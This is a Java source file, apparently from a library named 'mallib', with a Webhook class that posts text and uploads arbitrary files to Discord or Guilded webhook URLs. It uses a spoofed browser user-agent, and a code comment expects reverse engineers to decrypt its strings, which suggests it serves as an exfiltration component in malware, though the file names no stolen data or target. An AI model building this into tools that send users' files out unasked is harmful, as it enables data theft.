package oliver.mallib.other;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Scanner;

import oliver.mallib.utils.MultipartForm;

public class Webhook {
	
	public static String br = "\r";
	
	/**
	 * Sends a message through a Discord or Guilded webhook.
	 */
	public static void sendDiscordOrGuildedWebhook(String message, String webhookLink) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(webhookLink);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
	
	/**
	 * Sends a file through a Discord or Guilded webhook.
	 */
	public static String sendFileOverDiscordOrGuilded(File file, String url){
		try {
			HttpURLConnection connection = (HttpURLConnection)new URL(url).openConnection();
			
			String boundary="==="+System.currentTimeMillis()+"===";
			
			connection.setRequestProperty("Content-Type", "multipart/form-data; boundary="+boundary);
			connection.setRequestProperty("User-Agent", "THE WALLS ARE SPEAKING TO ME. THE WALLS ARE SPEAKING, THEY ARE FUCKING SPEAKING GAHAHAHHS HELP ME THEY ARE SPEAKING THEY ARE WATCHING"); // Funny schizo message if someone decrypts strings or something
			connection.setReadTimeout(5000);
			connection.setUseCaches(false);
			connection.setDoInput(true);
			connection.setDoOutput(true);
			
			MultipartForm form = new MultipartForm(boundary, connection.getOutputStream());
			form.addFile("fileName", file);
			form.end();
			
			connection.disconnect();
			
			return convert(new BufferedInputStream(connection.getInputStream()));
		} catch (Exception e) {
			return null;
		}
	}
	
	private static String convert(InputStream stream) { 
		@SuppressWarnings("resource") 
		Scanner scanner = new Scanner(stream).useDelimiter("\\A");
		return scanner.hasNext() ? scanner.next() : "/";
	}
	
}
